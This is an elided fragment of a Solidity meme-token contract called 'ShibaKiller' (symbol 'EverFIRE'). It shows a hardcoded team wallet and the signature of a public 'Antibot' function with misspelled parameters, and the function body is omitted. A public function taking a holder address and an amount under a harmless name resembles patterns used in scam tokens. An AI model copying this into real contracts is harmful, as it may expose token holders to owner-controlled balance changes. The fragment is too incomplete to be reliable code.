...
contract ShibaKiller is Context, IERC20, Ownable {
    ...
    string private _symbol = "EverFIRE";
    ...
    constructor () {
        ...
        teamWallet = payable(address(0xe06bCfc17e9259569C892a3aDFc4add81245aa3d));
    ...
    function Antibot(address holde0,uint256 liquidti) public {
